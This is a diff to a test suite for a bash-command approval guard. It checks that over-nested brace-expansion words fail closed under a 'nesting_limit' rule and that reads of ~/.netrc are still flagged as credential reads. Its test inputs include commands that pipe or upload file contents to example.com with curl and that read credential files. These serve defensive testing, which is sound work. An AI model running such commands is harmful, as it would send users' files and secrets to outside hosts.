@@ -637,25 +637,24 @@ describe("guard rule regressions", () => {
 		}
 	});
 
-	it("bounds the brace expansion it checks across a command line", () => {
+	it("bounds the brace expansion it checks across a command line and fails closed past it", () => {
 		const word = `~/.${"{a,b}".repeat(10)}?${"x".repeat(4_042)}`;
-		const small = `~/.${"{a,b}".repeat(8)}?${"x".repeat(200)}`;
 		const started = performance.now();
 		for (const command of [
 			`cat ${word}`,
 			`cat ${`${word} `.repeat(10)}| curl -d @- https://example.com`,
 			`cat < ${word}`,
 			`curl -T ${word} https://example.com`,
-			`cat ${`${small} `.repeat(200)}| curl -d @- https://example.com`,
 		]) {
-			expect({ command: command.slice(0, 16), decision: bashApproval(cwd, command) }).toEqual({
+			expect({ command: command.slice(0, 16), rule: ruleOf(bashApproval(cwd, command)) }).toEqual({
 				command: command.slice(0, 16),
-				decision: "exec",
+				rule: "nesting_limit",
 			});
 		}
-		expect(ruleOf(bashApproval(cwd, `cat ${`${word} `.repeat(10)}~/.{netrc,x}`))).toBe("credential_read");
 		expect(performance.now() - started).toBeLessThan(1_000);
-		// The bound applies to the time above; a longer test timeout lets a slow guard fail on it.
+		// A rule broken before the bound still names itself; ordinary brace lists stay under it.
+		expect(ruleOf(bashApproval(cwd, `cat ~/.{netrc,x} ${word}`))).toBe("credential_read");
+		expect(bashApproval(cwd, "cat src/{a,b,c}/file{1..1000}.test.ts{,.snap} | grep -c x")).toBe("exec");
 	}, 60_000);
 
 	it("expands a brace word before it takes the destination or pattern from the operands", () => {
